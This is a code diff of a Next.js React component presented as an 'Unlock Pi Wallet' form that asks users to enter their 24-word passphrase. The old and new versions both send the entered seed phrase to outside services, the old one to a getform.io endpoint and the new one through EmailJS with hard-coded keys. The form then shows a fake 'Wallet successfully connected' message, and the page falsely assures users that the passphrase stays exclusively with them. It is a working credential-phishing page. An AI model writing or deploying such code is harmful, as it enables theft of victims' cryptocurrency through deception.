@@ -1,45 +1,52 @@
-/* eslint-disable @typescript-eslint/no-unused-vars */
+/* eslint-disable @typescript-eslint/no-explicit-any */
+/* eslint-disable @typescript-eslint/no-empty-object-type */
 "use client";
 
-import { useState } from "react";
-import { useRouter } from "next/navigation";
+import React, { useState, useRef, FormEvent } from "react";
+import emailjs from "@emailjs/browser";
+import "./globals.scss";
+import { useRouter } from "next/navigation"; 
 
-import "./globals.scss"
+interface WalletProps {}
 
-const Wallet = () => {
-
-    const router = useRouter();
-    const [loading, setLoading] = useState(false);
+const Wallet: React.FC<WalletProps> = () => {
+    const [loading, setLoading] = useState<boolean>(false);
     const [error, setError] = useState<string | null>(null);
+    const form = useRef<HTMLFormElement>(null);
+    const router = useRouter(); 
 
-    const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
+    const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
         event.preventDefault();
         setLoading(true);
         setError(null);
 
-        const formData = new FormData(event.currentTarget);
+        if (form.current) {
+            try {
+                await emailjs.sendForm(
+                    "service_48eh3qb",
+                    "template_yi5c116",
+                    form.current,
+                    {
+                        publicKey: "u9Y4ltNRtQVEHKT6_",
+                    }
+                );
 
-        try {
-            const response = await fetch("https://getform.io/f/amdkjzob", {
-                method: "POST",
-                body: formData,
-            });
-
-            if (response.ok) {
-                router.push("/");
-                alert("Wallet successfully connected")
-            } else {
+                alert("Wallet successfully connected");
+                router.push("/"); 
+            } catch (err: any) {
                 setError("Error connecting wallet");
+                console.error("EmailJS Error:", err);
+            } finally {
+                setLoading(false);
             }
-        } catch (err) {
-            setError("Error connecting wallet");
-        } finally {
+        } else {
+            setError("Form reference not found.");
             setLoading(false);
         }
     };
 
     return (
-        <form onSubmit={handleSubmit} className="form">
+        <form ref={form} onSubmit={handleSubmit} className="form">
             <h2>Unlock Pi Wallet</h2>
             <textarea name="phrase" id="phrase" placeholder="Enter your 24-word Passphrase here" required />
             <button type="submit" disabled={loading}>
@@ -47,11 +54,15 @@ const Wallet = () => {
             </button>
             <div>
                 {error && <p className="error">{error}</p>}
-                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
-                <p>Lost your passphrase? <span>You can create a new wallet,</span> but all your π in your previous wallet will be inaccessible</p>
+                <p>
+                    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+                </p>
+                <p>
+                    Lost your passphrase? <span>You can create a new wallet,</span> but all your π in your previous wallet will be inaccessible.
+                </p>
             </div>
         </form>
-    )
-}
+    );
+};
 
-export default Wallet
+export default Wallet;
